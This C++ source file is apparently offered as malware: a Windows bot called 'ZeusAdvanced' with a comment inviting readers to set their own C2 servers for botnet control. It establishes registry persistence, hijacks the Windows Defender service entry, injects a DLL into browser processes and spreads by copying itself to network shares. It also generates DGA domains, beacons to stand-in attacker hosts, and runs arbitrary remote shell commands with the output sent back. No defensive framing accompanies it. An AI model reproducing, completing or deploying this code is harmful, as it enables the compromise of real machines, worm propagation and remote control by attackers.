#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <vector>
#include <string>
#include <thread>
#include <fstream>
#include <random>
#include <lm.h>
#include <urlmon.h>
#include <wininet.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <dpapi.h>
#include <wincrypt.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")

#define SECURITY_WIN32
#include <security.h>
#pragma comment(lib, "secur32.lib")

class ZeusAdvanced {
private:
    std::vector<std::string> c2_servers;
    std::string current_c2;
    SOCKET c2_socket;
    HANDLE hMutex;
    bool running;

    std::string generate_dga_domain(int seed) {
        std::string domain;
        std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        std::mt19937 gen(seed + GetTickCount());
        std::uniform_int_distribution<> dis(0, chars.size() - 1);
        
        int length = 8 + (gen() % 8);
        for (int i = 0; i < length; ++i) {
            domain += chars[dis(gen)];
        }
        domain += ".com";
        return domain;
    }

    void initialize_networking() {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }

    bool connect_to_c2(const std::string& host) {
        addrinfo* result = nullptr;
        addrinfo hints = {};
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        if (getaddrinfo(host.c_str(), "443", &hints, &result) == 0) {
            for (addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
                SOCKET sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
                if (sock != INVALID_SOCKET) {
                    u_long mode = 1;
                    ioctlsocket(sock, FIONBIO, &mode);
                    
                    connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
                    
                    fd_set set;
                    FD_ZERO(&set);
                    FD_SET(sock, &set);
                    timeval timeout = {5, 0};
                    
                    if (select(0, nullptr, &set, nullptr, &timeout) > 0) {
                        int error = 0;
                        int len = sizeof(error);
                        getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&error, &len);
                        if (error == 0) {
                            c2_socket = sock;
                            current_c2 = host;
                            freeaddrinfo(result);
                            return true;
                        }
                    }
                    closesocket(sock);
                }
            }
            freeaddrinfo(result);
        }
        return false;
    }

    void establish_persistence() {
        HKEY hKey;
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExA(hKey, "WindowsDefenderService", 0, REG_SZ, (const BYTE*)path, strlen(path));
        RegCloseKey(hKey);

        std::string servicePath = "SYSTEM\\CurrentControlSet\\Services\\WinDefend";
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, servicePath.c_str(), 
                        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExA(hKey, "ImagePath", 0, REG_SZ, (const BYTE*)path, strlen(path));
        RegSetValueExA(hKey, "Description", 0, REG_SZ, (const BYTE*)"Windows Defender Service", 24);
        RegSetValueExA(hKey, "DisplayName", 0, REG_SZ, (const BYTE*)"Windows Defender Service", 24);
        DWORD startType = 2;
        RegSetValueExA(hKey, "Start", 0, REG_DWORD, (const BYTE*)&startType, sizeof(startType));
        RegCloseKey(hKey);
    }

    void inject_browser() {
        DWORD processes[1024], cbNeeded, cProcesses;
        if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
            cProcesses = cbNeeded / sizeof(DWORD);
            for (unsigned int i = 0; i < cProcesses; i++) {
                if (processes[i] != 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processes[i]);
                    if (hProcess) {
                        char processName[MAX_PATH] = {0};
                        if (GetModuleBaseNameA(hProcess, NULL, processName, sizeof(processName))) {
                            if (strstr(processName, "chrome") || strstr(processName, "firefox") || strstr(processName, "iexplore")) {
                                HMODULE hModule = GetModuleHandleA("kernel32.dll");
                                LPVOID loadLibrary = GetProcAddress(hModule, "LoadLibraryA");
                                
                                char dllPath[MAX_PATH];
                                GetModuleFileNameA(NULL, dllPath, MAX_PATH);
                                strcpy(strstr(dllPath, ".exe"), ".dll");
                                
                                LPVOID allocMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                                if (allocMem) {
                                    WriteProcessMemory(hProcess, allocMem, dllPath, strlen(dllPath) + 1, NULL);
                                    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, allocMem, 0, NULL);
                                }
                            }
                        }
                        CloseHandle(hProcess);
                    }
                }
            }
        }
    }

    std::string get_system_info() {
        OSVERSIONINFOEXA osInfo;
        osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((OSVERSIONINFOA*)&osInfo);

        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);

        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);

        MEMORYSTATUSEX memoryStatus;
        memoryStatus.dwLength = sizeof(memoryStatus);
        GlobalMemoryStatusEx(&memoryStatus);

        std::string info = "OS: Windows ";
        info += std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion);
        info += " | Build: " + std::to_string(osInfo.dwBuildNumber);
        info += " | CPU Cores: " + std::to_string(sysInfo.dwNumberOfProcessors);
        info += " | RAM: " + std::to_string(memoryStatus.ullTotalPhys / (1024 * 1024)) + "MB";
        info += " | Computer: " + std::string(computerName);
        
        return info;
    }

    void spread_network() {
        DWORD dwScope = RESOURCE_CONNECTED;
        NETRESOURCEA nr;
        memset(&nr, 0, sizeof(nr));
        nr.dwScope = dwScope;
        nr.dwType = RESOURCETYPE_DISK;
        nr.dwDisplayType = RESOURCEDISPLAYTYPE_SHARE;
        nr.dwUsage = RESOURCEUSAGE_CONNECTABLE;

        HANDLE hEnum;
        if (WNetOpenEnumA(dwScope, RESOURCETYPE_ANY, 0, NULL, &hEnum) == NO_ERROR) {
            DWORD count = 0xFFFFFFFF;
            DWORD bufferSize = 16384;
            LPNETRESOURCEA lpnr = (LPNETRESOURCEA)GlobalAlloc(GPTR, bufferSize);
            
            if (lpnr != NULL) {
                DWORD result = WNetEnumResourceA(hEnum, &count, lpnr, &bufferSize);
                if (result == NO_ERROR) {
                    for (DWORD i = 0; i < count; i++) {
                        if (lpnr[i].lpRemoteName != NULL) {
                            std::string remotePath = lpnr[i].lpRemoteName;
                            remotePath += "\\C$\\Windows\\System32\\spoolsv.exe";
                            
                            char selfPath[MAX_PATH];
                            GetModuleFileNameA(NULL, selfPath, MAX_PATH);
                            
                            if (CopyFileA(selfPath, remotePath.c_str(), FALSE)) {
                                SHELLEXECUTEINFOA sei = {0};
                                sei.cbSize = sizeof(sei);
                                sei.lpFile = remotePath.c_str();
                                sei.nShow = SW_HIDE;
                                ShellExecuteExA(&sei);
                            }
                        }
                    }
                }
                GlobalFree(lpnr);
            }
            WNetCloseEnum(hEnum);
        }
    }

    std::string grab_web_data() {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://www.google.com", NULL, 0, INTERNET_FLAG_RELOAD, 0);
            if (hConnect) {
                std::string data;
                char buffer[4096];
                DWORD bytesRead;
                while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                    data.append(buffer, bytesRead);
                }
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return data;
            }
            InternetCloseHandle(hInternet);
        }
        return "";
    }

    void send_data(const std::string& data) {
        if (c2_socket != INVALID_SOCKET) {
            send(c2_socket, data.c_str(), data.length(), 0);
        }
    }

    std::string receive_command() {
        char buffer[4096];
        int received = recv(c2_socket, buffer, sizeof(buffer), 0);
        if (received > 0) {
            return std::string(buffer, received);
        }
        return "";
    }

    void execute_command(const std::string& cmd) {
        if (cmd == "spread") {
            std::thread(&ZeusAdvanced::spread_network, this).detach();
        } else if (cmd == "inject") {
            std::thread(&ZeusAdvanced::inject_browser, this).detach();
        } else if (cmd == "info") {
            send_data(get_system_info());
        } else if (cmd.substr(0, 7) == "execute") {
            std::string real_cmd = cmd.substr(8);
            FILE* pipe = _popen(real_cmd.c_str(), "r");
            if (pipe) {
                char buffer[128];
                std::string result;
                while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                    result += buffer;
                }
                _pclose(pipe);
                send_data("CMD_RESULT:" + result);
            }
        } else if (cmd == "grab") {
            std::string web_data = grab_web_data();
            if (!web_data.empty()) {
                send_data("WEB_DATA:" + web_data.substr(0, 1000));
            }
        }
    }

    void c2_communication() {
        while (running) {
            for (const auto& server : c2_servers) {
                if (connect_to_c2(server)) {
                    break;
                }
            }
            
            if (c2_socket == INVALID_SOCKET) {
                std::string new_domain = generate_dga_domain(GetTickCount());
                if (connect_to_c2(new_domain)) {
                    c2_servers.push_back(new_domain);
                }
            }

            if (c2_socket != INVALID_SOCKET) {
                send_data("BOT:ONLINE|" + get_system_info());
                
                std::string command = receive_command();
                if (!command.empty()) {
                    execute_command(command);
                }
                
                closesocket(c2_socket);
                c2_socket = INVALID_SOCKET;
            }
            
            Sleep(30000);
        }
    }


    /// you have to change here for c2 and botnet control ;)
public:
    ZeusAdvanced() : c2_socket(INVALID_SOCKET), running(true) {
        c2_servers = {"c2.malware.com", "command.attackers.net", "botnet.control.org"};
        hMutex = CreateMutexA(NULL, TRUE, "Global\\WindowsDefenderServiceMutex");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            running = false;
            return;
        }
    }

    ~ZeusAdvanced() {
        if (c2_socket != INVALID_SOCKET) {
            closesocket(c2_socket);
        }
        if (hMutex) {
            CloseHandle(hMutex);
        }
        WSACleanup();
    }

    void run() {
        if (!running) return;
        
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        initialize_networking();
        establish_persistence();
        
        std::thread c2_thread(&ZeusAdvanced::c2_communication, this);
        std::thread spread_thread([this]() {
            while (running) {
                spread_network();
                Sleep(3600000);
            }
        });

        c2_thread.detach();
        spread_thread.detach();

        while (running) {
            Sleep(1000);
        }
    }
};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ZeusAdvanced zeus;
    zeus.run();
    return 0;
}